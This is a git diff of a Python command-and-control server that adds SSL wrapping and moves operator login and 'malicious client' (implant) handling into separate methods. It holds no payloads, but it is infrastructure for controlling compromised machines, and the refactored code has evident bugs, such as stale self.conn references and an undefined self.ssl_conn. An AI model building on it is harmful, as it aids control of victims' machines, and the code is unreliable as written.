@@ -16,16 +16,18 @@ try:
     import math
     import threading
     import traceback
+    import ssl
 
     # My Modules
     #import json_parser_dev as json_parser
-    import DataEngine.JsonParser as json_parser
-    from DataEngine.Encryption import Encryptor
+    import DataEngine.JsonHandler as json_parser
+    from DataEngine.RSAEncryptionHandler import Encryptor
 
     from ClientEngine.FriendlyClientHandler import ServerFriendlyClientHandler
     from ClientEngine.MaliciousClientHandler import ServerMaliciousClientHandler
+    from ClientEngine.AuthenticationHandler import Authentication
     from Comms.CommsHandler import send_msg, receive_msg
-    from Utils.ServerUtils import str_encode, bytes_decode
+    from Utils.UtilsHandler import str_encode, bytes_decode
 
 except Exception as e:
     print(f"[server.py] Import Error: {e}")
@@ -131,6 +133,10 @@ class ServerSockHandler:
         
     ##!! dev note, in future iterations maybe add a webserver component, using post & get commands instead of this
     ## custom protocol stuff - who knows
+
+    ##### MOVE TO INDEPENDENT FILE ####
+        ## return respective items, or just use buffers
+
         try:
             self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             # this allows the socket to be reelased immediatly on crash/exit
@@ -140,10 +146,12 @@ class ServerSockHandler:
             self.server.bind(self.ADDR)
             ## A cleanup function incase of crash/on exit
             atexit.register(self.socket_cleanup)
+            logging.debug(f"[Server] Server started, and listening: {self.ADDR}")
+
             ## starting listener
             self.server.listen()
             self.connection_handler()
-            logging.debug(f"[Server] Server started, and listening: {self.ADDR}")
+        
         ##Exceptions: https://docs.python.org/3/library/exceptions.html#TimeoutError
         except TimeoutError as e:
             logging.warning(f"{self.Sx03}: \n ERRMSG: {e}\n")
@@ -153,19 +161,9 @@ class ServerSockHandler:
             logging.warning(f"{self.Sx05}: \nERRMSG:{e}\n")
         except Exception as e:
             logging.warning(f"ERRMSG: {e}\n")
+    ##### /END MOVE TO INDEPENDENT FILE ####
                 
-    def socket_cleanup(self):
-        """A cleanup function that is run on any type of exit. it makes sure the socket is closed properly
-        & no errors are run into. Left fairly empty for now, may have more use in the future.
-            
-        Called by start_server
-            """
-        try:
-            ## closing the connection
-            self.server.close()
-            logging.debug(self.Sx02)
-        except Exception as e:
-            logging.warning(f"{self.SxXX}:{e}")                
+              
         
     def connection_handler(self):
         """The loop that handles the conections, and passes them off to respective threads/classes
@@ -174,140 +172,50 @@ class ServerSockHandler:
             
         """
         while True:
-        ##== Initial  handling of client
-            try:
-                self.conn, addr = self.server.accept()
+        ##== Initial handling of client
+            ssl_socket = self.server_ssl_handler()
 
-                ## Getting client id from the client, and the IP address
-                self.client_remote_ip_port = f"{self.conn.getpeername()[0]}:{self.conn.getpeername()[1]}"
-                logging.debug(f"\n[{self.client_remote_ip_port} -> Server] [New Instance] Accepted Connection from: {self.client_remote_ip_port}")
-                        
-            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
-                logging.warning(f"[Server (connection_handler)] Client {self.client_remote_ip_port} disconnected")
-            except Exception as e:
-                logging.debug("[Server (connection_handler)] Unkown Error: {e}")                
-
+        ##### MOVE TO INDEPENDENT FILE ####
         ##== Parsing the message sent to the server. 
             try:
-                # English: Hey, I (server) wants to recieve a message. Not sure if encrypted or not, passing my private key to decrypt just in case
-                self.response = receive_msg(conn=self.conn, private_key=self.encryption.private_key)
+                # English: Hey, I (server) wants to recieve a message. Not sure if encrypted or not, passing my private key to the decrypt function just in case
+                response = receive_msg(conn=ssl_socket, private_key=self.encryption.private_key)
 
-                #print(self.response)
-                ## this whole section needs a rework
-                if self.response == "PUBKEY_REQUEST":
-                    logging.debug(f"[Server (PUBKEY_REQUEST)] {self.client_remote_ip_port} requested the Public Key")
+                ## Converting to json. Validation is disabled during dev.
+                response_from_client = self.json_parser.convert_and_validate(response)
 
-                    #Note, the pubkey is a byte object. send_msg does the handling for byte to str if necessary.
-                    send_msg(conn=self.conn, msg=self.encryption.public_key)#.decode()
+                if response_from_client: 
+                    client_type    = response_from_client["general"]["client_type"]
+                    id             = response_from_client["general"]["client_id"]
+                    message        = response_from_client["msg"]["msg_command"]
+                    action         = response_from_client["general"]["action"]
 
+                    print(f"DEBUG: MSG Breakdown\n\tSelf.client_type: {self.client_type}\n\tself.id: {self.id}\n\tself.message: {self.message}\n\tself.action: {self.action}\n\n")
                 else:
-                    #English: Making sure whatever data sent to me is valid JSON that follows the schema I'm looking for
-                    #NOte, vailadation is disabled
-                    incoming_message = self.json_parser.convert_and_validate(self.response)
-
-                    ## maybe get a typecheck in here, or create one in the ServerUtils
-                    if incoming_message: 
-                        self.client_type = incoming_message["general"]["client_type"]
-                        self.id = incoming_message["general"]["client_id"]
-                        self.message = incoming_message["msg"]["msg_command"]
-                        ## action to be performed
-                        self.action = incoming_message["general"]["action"]
-                        #Client Pubkey
-                        #self.client_pubkey = incoming_message["Main"]["general"]["client_pubkey"]
-
-                        print(f"MSG Breakdown\n\tSelf.client_type: {self.client_type}\n\tself.id: {self.id}\n\tself.message: {self.message}\n\tself.action: {self.action}\n\n")
-
-                    #English: I don't recognize this data schema/format. Killing the connection just to be safe
-                    else:
-                        logging.warning(f"[Server (connection_handler)] Unrecognized JSON, killing connection")
-                        self.conn.close()
+                    print("Nothing recieved from client")
 
             except Exception as e:
-                """ These can go away, defined in init
-                self.client_type = "None"
-                self.message = "None"
-                self.id = "None"
-                """
-                logging.debug(f"No message, or ID value was recieved. , error={e}")
+                logging.debug(f"No message, action, type, or id recieved. , error={e}")
                 print(traceback.format_exc())
-                             
+
         ##== The decision handler based on the client_type, which can be:
             ## !_clientlogin_!: A malicious client "logging" in
             ## !_userlogin_!: A friendly client trying to log in    
             
             ## == Decisions based on parsed messages
             if self.action == "!_userlogin_!":
-                username, password = None, None
-                try:
-                    # Try to extract the username and password from the message
-                    #username, password = self.id, self.message
-                    username = self.id = incoming_message["general"]["client_id"]
-                    password = self.id = incoming_message["general"]["password"]
-                except ValueError as e:
-                    # If there is a value error, set the username and password to None
-                    logging.debug(f"Value error with login, credentials probably passed wrong: {e}")
-                except Exception as e:
-                    # If there is any other exception, set the username and password to None
-                    logging.debug(f"Unknown error with logon process: {e}")
-
-
-                ## all friendly clients are refered to with !!~ infront of their name (has to do with identifying them in the gloabls function)
-                friendly_client_name = f"!!~{username}"                    
-                ## Running the authentication check, and starting the friendly client thread if successful
-                if self.password_eval(password):
-                    try:
-                        ##== sending the a-ok on successful authentication
-                        #self.conn.send(str_encode("0"))
-
-                        #self.send_msg_global(msg="0")
-                        send_msg(msg="0", conn=self.conn)
-
-                        logging.debug(f"[Server (Logon)] Successful Logon from: {friendly_client_name}")
-                        # Add friendly client to current clients list
-                        self.friendly_current_clients.append(friendly_client_name)
-                            
-                        ## This adds the class instance to the globals list, with the name being friendly_client_name. This allows
-                        ## it to be accessed in other parts of the code, and is the backbone of how all this works. 
-                        ## additionally, this is where the connection is passed off to the ServerFriendlyClientHandler class
-                        self.friendly_clients[friendly_client_name] = ServerFriendlyClientHandler(self.conn, self.ADDR, self.json_parser)
-                        globals()[friendly_client_name] = self.friendly_clients[friendly_client_name]
-
-                        ## == Thread handler
-                        # Create thread for the friendly client's communication
-                        threading.Thread(
-                            target=self.friendly_clients[friendly_client_name].friendly_client_communication,
-                            args=(self.response, username)
-                            ).start()
-
-                    except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
-                        logging.warning(f"Friendly Client {friendly_client_name} disconnected")
-                    except Exception as e:
-                        logging.warning(f"[Error]:{e}")
-                        
-                ## On failed authentication, sending back a 1 & log
-                else:
-                    #self.conn.send(str_encode("1"))
-                    send_msg(msg="1", conn=self.conn)
-                    logging.critical(f"[{self.client_remote_ip_port} -> Server (Logon)] Failed logon from '{username}'")                
-            
+                self.userloginhandler(
+                    response_from_client=response_from_client,
+                    ssl_conn = ssl_socket
+                )
+             
             ## !_client_! handler
             elif self.action == "!_clientlogin_!":
-                # construct client name based on its IP and ID (IP & ID help avoid collisions in naming)
-                client_name = "client_" + self.conn.getpeername()[0].replace(".", "_") + "_" + self.id
-
-                # If client is not in current clients list, add it
-                if client_name not in self.current_clients:
-                    self.current_clients.append(client_name)
-
-                    # Create a new malicious client handler instance and add it to the clients dict
-                    self.clients[client_name] = ServerMaliciousClientHandler()
-                    globals()[client_name] = self.clients[client_name]
-
-                # Create a new thread for this client's communication
-                threading.Thread(
-                    target=self.clients[client_name].handle_client,
-                    args=(self.conn, self.response, self.id)
-                    ).start()                    
+                self.clientloginhandler(
+                    ssl_conn = ssl_socket,
+                    response_from_client=response_from_client
+                )
+            
             ## Getting rid of any http traffic that made its way to the c2 server instead of the webserver
             elif any(method in self.client_type for method in ["GET", "HEAD", "POST", "INFO", "TRACE"]): ## sends a 403 denied via web browser/for scrapers
                 ## I should capture these too and see whos hitting it
@@ -319,23 +227,155 @@ class ServerSockHandler:
                 logging.warning(f"Unexpected Connection from {self.client_remote_ip_port}. Received: {self.response} ")
                 self.conn.close()
 
-    def password_eval(self, password=None) -> bool:
-        """
-        The password eval function. returns true if successful. Will be encrypted when I get around to that
 
-        password (str): the password given by the client
-        """
-        ## decrypt pass
-        _password = str(password)
-        if _password == None:
-            logging.debug("[Server (password_eval)] Password with value of 'None' passed to the password eval function")
+    def server_ssl_handler(self) -> socket:
+        '''
+        This function accepts connections, wraps them in SSL, and returns the SSL enabled socket.
+        '''
+        try:
+            non_ssl_conn, addr = self.server.accept()
+
+        ## Getting client id from the client, and the IP address
+            ## this var is only used for printing info, not as any 'real' data
+            self.client_remote_ip_port = f"{self.conn.getpeername()[0]}:{self.conn.getpeername()[1]}"
+            logging.debug(f"\n[{self.client_remote_ip_port} -> Server] [New Instance] Accepted Connection from: {self.client_remote_ip_port}")
+
+        # Wrapping socket into SSL socket
+            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+            ssl_context.load_cert_chain(certfile='server.crt', keyfile='server.key')  # Load server's certificate and private key
+            ssl_socket = ssl_context.wrap_socket(non_ssl_conn, server_side=True)
+            
+            return ssl_socket
+
+        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
+            logging.warning(f"[Server (connection_handler)] Client {self.client_remote_ip_port} disconnected")
+        except Exception as e:
+            logging.debug("[Server (connection_handler)] Unkown Error: {e}")     
+  
+    def socket_cleanup(self):
+        """A cleanup function that is run on any type of exit. it makes sure the socket is closed properly
+        & no errors are run into. Left fairly empty for now, may have more use in the future.
+            
+        Called by start_server
+            """
+        try:
+            ## closing the connection
+            self.server.close()
+            logging.debug(self.Sx02)
+        except Exception as e:
+            logging.warning(f"{self.SxXX}:{e}")  
+
+    def userloginhandler(self, response_from_client, ssl_conn):
+        '''
+        This function:
+            - Sees if a client has logged in before
+            - Checks authentication
+            - Creates an instance of FriendlyClientHandler.py
+            - Puts that instance in a new thread
         
-        ## the else covers my ass for any potential injection/rifraff with the None parameter
+        '''
+        ## attempting to retrieve JSON values
+        username, password = None, None
+        try:
+            # Try to extract the username and password from the message
+             #username, password = self.id, self.message
+            username = response_from_client["general"]["client_id"]
+            password = response_from_client["general"]["password"]
+        
+        except ValueError as e:
+                    # If there is a value error, set the username and password to None
+            logging.debug(f"Value error with login, credentials probably passed wrong: {e}")
+        except Exception as e:
+                    # If there is any other exception, set the username and password to None
+            logging.debug(f"Unknown error with logon process: {e}")
+
+
+        ## all friendly clients are refered to with !!~ infront of their name (has to do with identifying them in the gloabls function)
+        friendly_client_name = f"!!~{username}"                    
+        
+        ## Running the authentication check, and starting the friendly client thread if successful
+        if Authentication.password_eval(password):
+            try:
+                ##== sending the a-ok on successful authentication
+                send_msg(msg="0", conn=self.conn)
+
+                logging.debug(f"[Server (Logon)] Successful Logon from: {friendly_client_name}")
+                # Add friendly client to current clients list
+                self.friendly_current_clients.append(friendly_client_name)
+                            
+                ## This adds the class instance to the globals list, with the name being friendly_client_name. This allows
+                ## it to be accessed in other parts of the code, and is the backbone of how all this works. 
+                ## additionally, this is where the connection & parameters are passed off to the ServerFriendlyClientHandler class.
+                
+                self.friendly_clients[friendly_client_name] = ServerFriendlyClientHandler(self.conn, self.ADDR, self.json_parser)
+                globals()[friendly_client_name] = self.friendly_clients[friendly_client_name]
+
+                ## == Thread handler
+                # Create thread for the friendly client's communication
+                threading.Thread(
+                    target=self.friendly_clients[friendly_client_name].friendly_client_communication,
+                    args=(self.response, username)
+                    ).start()
+
+            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
+                logging.warning(f"Friendly Client {friendly_client_name} disconnected")
+            except Exception as e:
+                logging.warning(f"[Friendly Client Error]:{e}")
+                        
+        ## On failed authentication, sending back a 1 & log
         else:
-            if _password == self.server_password:
-                return True
-            else:
-                return False
+            #self.conn.send(str_encode("1"))
+            send_msg(msg="1", conn=self.conn)
+            logging.critical(f"[{self.client_remote_ip_port} -> Server (Logon)] Failed logon from '{username}'")  
+
+    def clientloginhandler(self, ssl_conn, response_from_client):
+        '''
+        This function:
+            - Sees if a client has logged in before
+            - Creates an instance of MaliciousClientHandler.py
+            - Puts that instance in a new thread
+
+        Note, if there is an exception, the function returns to continue on with the conn loop. might take some work
+        
+        '''
+        id = None
+        try:
+            # Try to extract the username and password from the message
+             #username, password = self.id, self.message
+            id = response_from_client["general"]["client_id"]
+        
+        except ValueError as e:
+                    # If there is a value error, set the username and password to None
+            logging.debug(f"Value error with login, credentials probably passed wrong: {e}")
+            return
+        
+        except Exception as e:
+            # If there is any other exception, set the username and password to None
+            logging.debug(f"Unknown error with logon process: {e}")
+            return
+        
+        # construct client name based on its IP and ID (IP & ID help avoid collisions in naming)
+        #client_name = "client_" + self.conn.getpeername()[0].replace(".", "_") + "_" + self.id
+
+        #note, ssl_conn.getpeername may not work
+        client_name = "client_" + self.ssl_conn.getpeername()[0].replace(".", "_") + "_" + self.id
+        
+        # If client is not in current clients list, add it
+        if client_name not in self.current_clients:
+            self.current_clients.append(client_name)
+
+            # Create a new malicious client handler instance and add it to the clients dict
+            self.clients[client_name] = ServerMaliciousClientHandler()
+            globals()[client_name] = self.clients[client_name]
+
+        # Create a new thread for this client's communication
+        threading.Thread(
+            target=self.clients[client_name].handle_client,
+            args=(ssl_conn, self.response, id)
+            ).start()  
+
+
+
 #if __name__ == "__main__":
 if fileserverport == port:
     logging.critical(f"[SERVER] Fileserver ({fileserverport}) & Listenserver ({port}) port are the same. They need to be different ")
